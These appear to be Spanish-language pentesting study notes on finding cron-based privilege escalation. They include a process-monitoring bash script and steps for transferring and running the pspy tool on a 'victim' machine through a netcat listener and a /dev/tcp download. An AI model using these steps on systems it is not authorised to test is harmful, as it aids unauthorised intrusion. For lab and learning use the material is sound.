**Tareas CRON** -> Tareas que se ejecutan en el sistema a _intervalos regulares de tiempo_ las cuales se especifican en **/etc**.

```zsh
crontab -l
```
---
Para ver las tareas que se estan ejecutando en vivo podemos crear el siguiente script con el siguiente contenido. Por comodidad se suele llamar _procmon.sh_:

```bash
#!/bin/bash
old_process=$(ps -eo user,command)

while true; do
	new_process=$(ps -eo user,command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|command|kworker"
	old_process=$new_process
done
```

donde dice `grep -vE "procmon|command|kworker"` -> Se ponen las palabras q no queres q muestre.

Este script se puede dejar _10_-_20 minutos_ para detectar:
- scripts en cron
- servicios de systemd que se ejecutan periódicamente
- procesos temporales de backup, logs, etc.

Si en **20–30 minutos** no aparece un proceso interesante (root ejecutando algo que puedas modificar/inyectar), ya podés pasar a otras técnicas de privesc.

---
Tenemos otra forma de enlistar los procesos que estan corriendo y es con el script _pspy_ -> (https://github.com/DominicBreuker/pspy?tab=readme-ov-file -> el de 64 bits). Para transferirlo a la maquina victima podes hacer lo siguiente:

Ponerte en escucha ofreciendo el archivo:

```bash
nc -nlvp 4444 < pspy64
```

y en la victima:

```bash
cat < /dev/tcp/192.168.0.0/4444 > pspy64
```

Si en las 2 maquinas el hash md5 es el mismo (`md5sum pspy64`) --> `chmod +x pspy64` -> `./pspy64` --> Felicitaciones! tenes un script que enlista procesos con colorcitos y toda la pinchila!!!


